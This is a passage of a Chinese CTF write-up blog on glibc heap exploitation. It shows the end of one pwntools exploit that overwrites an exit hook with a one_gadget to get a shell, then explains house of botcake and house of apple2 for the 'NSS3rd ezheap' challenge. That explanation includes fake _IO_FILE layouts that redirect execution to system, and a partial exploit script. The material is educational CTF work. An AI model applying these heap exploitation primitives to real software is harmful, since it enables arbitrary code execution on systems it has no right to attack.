    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'gift '</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xe4870</span>
leak_info<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
system<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
exit_hook<span class="token operator">=</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x619f68</span>
leak_info<span class="token punctuation">(</span><span class="token string">'exit_hook'</span><span class="token punctuation">,</span>exit_hook<span class="token punctuation">)</span>
one_gadgets<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4f2be</span><span class="token punctuation">,</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span><span class="token number">0x4f322</span><span class="token punctuation">,</span><span class="token number">0x10a38c</span><span class="token punctuation">]</span>
gadget<span class="token operator">=</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span>one_gadgets<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
leak_info<span class="token punctuation">(</span><span class="token string">'gadget'</span><span class="token punctuation">,</span>gadget<span class="token punctuation">)</span>
<span class="token comment">#1</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>exit_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p8<span class="token punctuation">(</span>gadget<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#2</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>exit_hook<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#3</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>exit_hook<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#4</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>exit_hook<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">24</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#5</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>exit_hook<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#修改文件描述符</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'exec 1>&amp;0'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本地没通远程通了，乐</p>
<h2 id="28-NSS3rd-ezheap，-从一道题看house-of-botcake-house-of-apple2"><a href="#28-NSS3rd-ezheap，-从一道题看house-of-botcake-house-of-apple2" class="headerlink" title="28.NSS3rd ezheap，(从一道题看house of botcake,house of apple2)"></a>28.NSS3rd ezheap，(从一道题看house of botcake,house of apple2)</h2><p>不错的模板题目，用于练手熟悉两个house挺好的，有更简单的打法，但我为了练习house of apple2用了更复杂一点的方法，house of apple还是使用条件最简单，当前最好用的house，对其板子的熟练应用也是必须的，这里从这一道题目来记录一下，不过这道题打的不是largebin attack，而是利用tcache，不过house of apple的原理是一样的。</p>
<p>非常标准的菜单题目，2.35保护全开64位，在进入菜单前有一个密码的输入，密码是一个自定义字符集的base64解码，有add，delete，show，还有exit。</p>
<p><img src="/images/v2-a6ec5c57d287164ea8bef12f79ee3f0a_720w.png" alt="img"></p>
<p><img src="/images/v2-e96a44290c6b2cf81e43a5b0951f52cf_720w.png" alt="img"></p>
<p><img src="/images/v2-299dde1c29ff02de716670269f52369f_720w.png" alt="img"></p>
<p>add很简单，输入index，size，content，都没有限制，只是index不能过大。size不大于0x4ff即可</p>
<p><img src="/images/v2-21f4e4dcce738885db030d040e050498_720w.png" alt="img"></p>
<p>delete有一个uaf，show就是正常的show</p>
<p><img src="/images/v2-302f0f7d4d1b09fcdeee7546d3145174_720w.png" alt="img"></p>
<p>思考思路，因为是2.35，所以hook都失效了，首先需要泄露libc和heap地址，都很简单，因为没有edit，所以uaf需要考虑怎么使用，考虑使用double free，而因为无法edit，不能清空，无法double free，所以考虑使用house of botcake，实现doublefree。实现double free后我们就可以控制tcache链中的fd指针指向任意位置，实现了任意位置写，到这里就有很多办法了，我这里使用house of apple2，打_IO_wfile_overflow。先来看house of botcake</p>
<h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h3><ul>
<li>漏洞：double free</li>
<li>适用：2.26-latest</li>
<li>条件：可以多次释放 chunk 进入tcache(大于0x80)，且能指定释放</li>
</ul>
<p>以用于绕过 tcache-&gt;key 的检查，利用过程如下：</p>
<ul>
<li>申请 7 个大小相同，大小大于 0x80 的 chunk，再申请三个，分别为 chunk A 和 chunkB 和 chunk C （C用于防止和topchunk合并）</li>
<li>释放前 7 个和 chunk A，前面 7 个都会进入到 tcachebin 里面，chunk A 进入到 unsortedbin</li>
<li>释放 chunk B，则 chunk B 会和 chunk A 合并，在unsortedbin中（与A相邻，B在A后申请）</li>
<li>从 tcachebin 分配走一个</li>
<li>再次释放 chunk B，此时 B 同时存在与 unsortedbin 和 tcachebin </li>
<li>后续就可以利用double free了</li>
</ul>
<p>接下来看这道题目的house of botcake部分</p>
<p>首先我们泄露libc和heap基址，前面是进入menu的base64解码，我们申请三个chunk，一个释放进入tcache，一个释放进入unsortedbin，再分别show，就可以得到libc和heap地址了，我们知道，从glibc2.32开始，tcache引入了堆指针异或加密，具体来说就是fd指针不再直接存储指向的地址， 而是会有一个加密的过程，<strong>会做一个异或操作，即fd的原有的值右移12位，与fd的地址值做异或，再存入fd</strong>，即*<em>：**</em><code>fd=(fd&gt;&gt;12)^&amp;fd</code><strong>,而要获得原有的fd值，异或回去即可</strong>：****fd=fd^(&amp;fd&gt;&gt;12)**所以我们要想修改fd的值，就需要得到当前fd的地址，也就是chunk的地址，所以我们需要先泄露heap基地址。 如果tcache中只有一个chunk，那fd值本该为0，但因为异或，所以fd中存储的值就是heap基地址右移12位，所以如果能泄露这一个值，只要将泄露的左移12位就可以得到heap基地址了。</p>
<p>这里就是这样泄露基地址的，很简单,再利用unsortedbin泄露出libc地址</p>
<p><img src="/images/v2-202f5a89bc2bfe5203e0641e660342ee_720w.png" alt="img"></p>
<p>在确定了我们想打house of apple后，我们就需要考虑，如何劫持<code>_IO_list_all</code>，一般来说，我们会打largebin attack来去劫持，但这道题因为我们无法去写largebin的bk_next，所以我们就使用tcache来劫持，我们的想法是，因为有uaf，所以利用double free，将<code>_IO_2_1_stderr_</code> 加入tcache中，就可以成功构造fake_IO，且我们可以直接申请两个chunk，作为后续可控的chunk，这是后话，这里先看这道题是怎么利用house of botcake的</p>
<p><img src="/images/v2-6936d439d28b7e611ec74f3f892ff95f_720w.png" alt="img"></p>
<p>首先申请10个chunk，释放chunk0-6，将tcache填满，再释放chunk8，进入unsortedbin：</p>
<p><img src="/images/v2-ff0888bfa35fe4ccb5418d10b3829e98_720w.png" alt="img"></p>
<p>接下来释放chunk7，与chunk8合并，进入unsortedbin：</p>
<p><img src="/images/v2-5304164eddf79e50648382ca4602f8a4_720w.png" alt="img"></p>
<p>接下来申请一个大小为0x110的chunk，让tcache空出来一个，再释放chunk8，chunk8就进入了tcache，实现了double free：</p>
<p><img src="/images/v2-a664579261ee1d882656e1e0c4faedca_720w.png" alt="img"></p>
<p>接下来对unsortedbin进行切割，切割到我们可以修改chunk8的fd值，将其指向_IO_2_1_stderr即可，成功劫持到。</p>
<p> 这里稍微记录一下，修改chunk8的fd值：</p>
<p>add(index=12,size=0xf0,content=p64(0)*2+p64(((heap+0x1060)&gt;&gt;12)^stderr)) </p>
<p>这里heap+0x1060就是当前存储着chunk8的fd的地址，也就是 0x555b81b04060 ，又移后与我们要存入的stderr值进行异或，就可以顺利存储了。</p>
<p><img src="/images/v2-e077aa42a6a639c70a79805b191e12a3_720w.png" alt="img"></p>
<p>house of botcake的利用就打完了，接下来就是house of apple2的利用了。</p>
<h3 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h3><p>这是一种利用条件简单，效果稳定的IO打法，可以说已经淘汰了许多其他的house，因为其他的house在利用条件上只会比house of apple更加苛刻。是<a target="_blank" rel="noopener" href="https://www.roderickchan.cn/zh-cn/">roderick</a>师傅2022年发现的一种利用方法。到现在依然非常有效</p>
<p>在glibc2.34版本，去掉了malloc hook，free hook，以及exit hook的利用链（dl_rtld_lock_recursive，dl_rtld_unlock_recursive），这些方法失效后，在高版本中的堆利用就只能打栈或者打IO了。</p>
<ul>
<li>版本：latest</li>
<li>使用条件：</li>
<li>泄露heap地址，libc地址</li>
<li>能控制程序执行 IO 操作，包括但不限于：从 main 函数返回、调用 exit 函数、通过<code>__malloc_assert</code> 触发</li>
<li>能控制_IO_FILE 的 vtable 和_wide_data，一般使用 largebin attack 去控制 </li>
<li>有三个可以控制的chunk</li>
<li>利用原理：struct <code>_IO_wide_data</code>结构体中，有一个<code>_wide_vtable</code>成员，在调用<code>_wide_vtable</code>虚表里面的函数时，同样是使用宏去调用，但与调用vtable不同，<strong>没有关于 vtable 的合法性检查。</strong></li>
<li>利用：因此，我们可以劫持IO_FILE的vtable为<code>_IO_wfile_jumps</code>，控制_wide_data为可控的堆地址空间，进而控制_<code>wide_data-&gt;_wide_vtable</code>为可控的堆地址空间。控制程序执行IO流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流</li>
<li>利用_IO_wfile_overflow 函数控制程序执行流：这里直接照原作者的博客记录fake_IO的设置：</li>
</ul>
<p>对 fp 的设置如下：</p>
<ul>
<li>_flags 设置为 ~(2 | 0x8 | 0x800)，如果不需要控制 rdi，设置为 0 即可；如果需要获得 shell，可设置为 sh;，注意前面有两个空格</li>
<li>vtable 设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code> 地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow </code>即可</li>
<li><code>_wide_data</code> 设置为可控堆地址 A，即满足 *(fp + 0xa0) = A</li>
<li>_<code>wide_data-&gt;_IO_write_base</code> 设置为 0，即满足 *(A + 0x18) = 0</li>
<li><code>_wide_data-&gt;_IO_buf_base</code> 设置为 0，即满足 *(A + 0x30) = 0</li>
<li>_<code>wide_data-&gt;_wide_vtable </code>设置为可控堆地址 B，即满足 *(A + 0xe0) = B</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> 设置为地址 C 用于劫持 RIP，即满足 *(B + 0x68) = C（比如，如果可以打system，这里地址C就设置为system地址既可） </li>
<li>调用时rdi的值即为fp-&gt;_flags </li>
</ul>
<p>函数的调用链如下：</p>
<pre class="line-numbers language-none"><code class="language-none">_IO_wfile_overflow
    _IO_wdoallocbuf
        _IO_WDOALLOCATE
            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>也有其他的函数调用链可以实现，这里不做记录</p>
<p>总结：house of apple 主要关注对_IO_FILE-&gt;_wide_data 成员的攻击，并可以在劫持该成员之后改写地址内容或者控制程序执行流。</p>
<p>可以看到，对_wide_data-&gt;_wide_vtable 虚表的成员函数指针调用时并不存在 vtable 的检查，因此，可以利用该漏洞进行 FSOP。</p>
<p>在实际利用的时候，可以观察寄存器的值，以便选择合适的 gadget。</p>
<p>从题目看更为直观，回到题目，使用_IO_wfile_overflow利用链，在前面，我们已经利用house of botcake造成了doublefree，控制_IO_2_1_stderr_来实现house of apple 的利用，整个利用，我们会伪造三个chunk，第一个称为fake_IO，用于控制_IO_2_1_stderr_，第二个称作chunkA，用于替换fake_IO中的 _wide_data，第三个是chunkB，用于 控制_wide_data-&gt;_wide_vtable。 </p>
<p>结构体的构造：</p>
<ul>
<li>fake_IO</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">&#123;
  file &#x3D; &#123;
    _flags &#x3D; 0x68732020, &#x2F;&#x2F; 不含有2、8、800，偏移为0
    _IO_read_ptr &#x3D; 0x101, 
    _IO_read_end &#x3D; 0x0,
    _IO_read_base &#x3D; 0x0,
    _IO_write_base &#x3D; 0x0, &#x2F;&#x2F; _IO_write_ptr &gt; _IO_write_base，偏移为0x20
    _IO_write_ptr &#x3D; 0x1,  &#x2F;&#x2F; 偏移为0x28
    _IO_write_end &#x3D; 0x0,
    _IO_buf_base &#x3D; 0x0,
    _IO_buf_end &#x3D; 0x0,
    _IO_save_base &#x3D; 0x0,
    _IO_backup_base &#x3D; 0x0,
    _IO_save_end &#x3D; 0x0,
    _markers &#x3D; 0x0,
    _chain &#x3D; 0x0,
    _fileno &#x3D; 0x0,
    _flags2 &#x3D; 0x0,
    _old_offset &#x3D; 0x0,
    _cur_column &#x3D; 0x0,
    _vtable_offset &#x3D; 0x0,
    _shortbuf &#x3D; &#123;0x0&#125;,
    _lock &#x3D; 0x0,
    _offset &#x3D; 0x0,
    _codecvt &#x3D; 0x0,
    _wide_data &#x3D; 0x56351e9e6b20, &#x2F;&#x2F; _wide_data设置为可控堆块A的地址，偏移0xa0
    _freeres_list &#x3D; 0x0,
    _freeres_buf &#x3D; 0x0,
    __pad5 &#x3D; 0x0,
    _mode &#x3D; 0x0,
    _unused2 &#x3D; &#123;0x0 &lt;repeats 20 times&gt;&#125;
  &#125;,
  vtable &#x3D; 0x7f7e2aefb0c0 &#x2F;&#x2F; vtable要使得调用函数_IO_wfile_overflow，因此可以构造为_IO_wfile_jumps的偏移，偏移为0xd8
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这道题目中：</p>
<pre class="line-numbers language-none"><code class="language-none">fake_io_addr &#x3D; stderr
fake_io &#x3D;b&#39;  sh&#39;
fake_io &#x3D; fake_io.ljust(0x28,b&#39;\x00&#39;)+p64(1)# fp-&gt;_IO_write_ptr &gt; _IO_write_base
fake_io &#x3D; fake_io.ljust(0x30,b&#39;\x00&#39;)+p64(0)#IO_write_base
fake_io &#x3D; fake_io.ljust(0xa0,b&#39;\x00&#39;)+p64(chunka_addr)#fp-&gt;_wide_data&#x3D;chunka
fake_io &#x3D; fake_io.ljust(0xd8,b&#39;\x00&#39;)+p64(libc.sym[&#39;_IO_wfile_jumps&#39;])#vtabel&#x3D;_IO_wfile_jumps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>chunkA:</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">&#123;
  _IO_read_ptr &#x3D; 0x0,
  _IO_read_end &#x3D; 0x0,
  _IO_read_base &#x3D; 0x0,
  _IO_write_base &#x3D; 0x0, &#x2F;&#x2F; _IO_write_base为0，偏移为0x18
  _IO_write_ptr &#x3D; 0x0,
  _IO_write_end &#x3D; 0x0,
  _IO_buf_base &#x3D; 0x0, &#x2F;&#x2F; _IO_buf_base为0，偏移为0x30
  _IO_buf_end &#x3D; 0x0,
  _IO_save_base &#x3D; 0x0,
  _IO_backup_base &#x3D; 0x0,
  _IO_save_end &#x3D; 0x0,
  _IO_state &#x3D; &#123;
	...
  &#125;,
  _IO_last_state &#x3D; &#123;
	...
  &#125;,
  _codecvt &#x3D; &#123;
	...
  &#125;,
  _shortbuf &#x3D; L&quot;&quot;,
  _wide_vtable &#x3D; 0x56351e9e6c20 &#x2F;&#x2F; _wide_vtable为可控堆块B，偏移为0xe0
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在本题中：</p>
<pre class="line-numbers language-none"><code class="language-none">chunka&#x3D;p64(0)*3 + p64(0) # _wide_data -&gt; _IO_write_base &#x3D; 0
chunka&#x3D;chunka.ljust(0x30,b&#39;\x00&#39;)+p64(0) # _wide_data -&gt; _IO_buf_base
chunka&#x3D;chunka.ljust(0xe0,b&#39;\x00&#39;)+p64(chunkb_addr) #_wide_data-&gt;_wide_vtable &#x3D; chunk B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ul>
<li>chunkB:</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">*(B + 0x68) &#x3D; func<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在本题中，因为没有沙箱，可以打system：</p>
<pre class="line-numbers language-none"><code class="language-none">chunkb&#x3D;p64(0).ljust(0x68, b&#39;\x00&#39;) + p64(libc.sym[&#39;system&#39;])#_wide_vtable-&gt;doallocate&#x3D;system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这样就可以实现house of apple的利用，通过exit退出，就可以触发，从而拿到shell。</p>
<p><img src="/images/v2-305025ff7ddd7525d50c9929cc654192_720w.png" alt="img"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll
<span class="token keyword">import</span> base64
filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node7.anna.nssctf.cn'</span><span class="token punctuation">,</span><span class="token number">20051</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'choice: '</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">'index: '</span>
add_size_words <span class="token operator">=</span> <span class="token string">'size: '</span>
add_content_words <span class="token operator">=</span> <span class="token string">'content'</span>

menu_del <span class="token operator">=</span> <span class="token number">2</span>
del_index_words <span class="token operator">=</span> <span class="token string">'index: '</span>

menu_show <span class="token operator">=</span> <span class="token number">3</span>
show_index_words <span class="token operator">=</span> <span class="token string">'index: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">44</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>

<span class="token comment"># 自定义字符集</span>
custom_charset <span class="token operator">=</span> <span class="token string">"abcdefghijklMNOPQRSTUVWXYZABCDEFGHIJKL0123456789+/mnopqrstuvwxyz"</span>
<span class="token comment"># 目标字符串</span>
target_str <span class="token operator">=</span> <span class="token string">"NSSCTF3rd"</span>
<span class="token comment"># 标准Base64编码</span>
standard_b64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>target_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 使用自定义字符集进行编码</span>
custom_b64 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>custom_charset<span class="token punctuation">[</span><span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> standard_b64<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"输入这个字符串:"</span><span class="token punctuation">,</span> custom_b64<span class="token punctuation">)</span>
<span class="token comment">#TLNTQpRgMrjK</span>
